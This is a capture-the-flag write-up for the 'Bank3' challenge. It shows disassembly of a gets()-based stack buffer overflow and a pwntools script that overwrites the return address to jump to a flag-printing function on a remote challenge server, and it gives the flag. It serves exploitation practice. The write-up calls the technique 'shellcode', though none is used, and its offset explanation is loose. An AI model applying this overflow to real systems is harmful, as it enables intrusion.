# **Bank3**

Pseudo code from IDA:

```c++
void getFlag()
{
  system("cat flag.txt");
}
void Register()
{
  char name[64]; // [esp+Ch] [ebp-4Ch] BYREF
  int balance; // [esp+4Ch] [ebp-Ch]

  balance = 0;
  printf("[+] Please enter your name: ");
  gets(name);
  printf("[+] Thanks for the registration, your balance is %d.\n", balance);
}
```

Objdump of `Register`

```objdump
public Register
Register proc near

name= byte ptr -4Ch
balance= dword ptr -0Ch
var_4= dword ptr -4

; __unwind {
push    ebp
mov     ebp, esp
push    ebx
sub     esp, 54h
call    __x86_get_pc_thunk_bx
add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)
mov     [ebp+balance], 0
sub     esp, 0Ch
lea     eax, (aPleaseEnterYou - 804A000h)[ebx] ; "[+] Please enter your name: "
push    eax             ; format
call    _printf
add     esp, 10h
sub     esp, 0Ch
lea     eax, [ebp+name]
push    eax             ; s
call    _gets
add     esp, 10h
sub     esp, 8
push    [ebp+balance]
lea     eax, (aThanksForTheRe - 804A000h)[ebx] ; "[+] Thanks for the registration, your b"...
push    eax             ; format
call    _printf
add     esp, 10h
nop
mov     ebx, [ebp+var_4]
leave
retn
; } // starts at 8048531
Register endp
 ```

No direct way to `getFlag()` in `Register()` this time. So we need to call the `getFlag()` by shellcode. IDA gives us the address of `getFlag` is `0x08048506`. So we need to overwrite 12(`0xC`) bytes of `balance`, 4 bytes of `var_4` in assembly code function in addition to 64 (`0x4C`) bytes of `name` to access to `getFlag`.

The exploit code:

```python
from pwn import *

r = remote("61.28.237.24",30204)
#r = process('./bank3')
r.recvuntil('[+] Please enter your name: ')
payload= "A"*64+16*"B"+p32(0x08048506)
r.send(payload)
r.interactive()
#HCMUS-CTF{overwrite_all_the_things}
```

[**Turn Back**](README.md)